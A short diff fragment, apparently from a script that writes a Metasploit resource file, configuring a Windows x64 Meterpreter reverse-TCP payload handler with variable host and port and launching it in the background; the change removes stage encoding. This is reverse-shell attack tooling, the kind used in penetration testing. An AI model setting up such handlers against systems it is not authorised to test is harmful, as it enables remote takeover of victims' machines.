@@ -31,7 +31,6 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST $LHOST
 set LPORT $PORT
 set ExitOnSession false
-set EnableStageEncoding true
 
 exploit -j -z
 RC
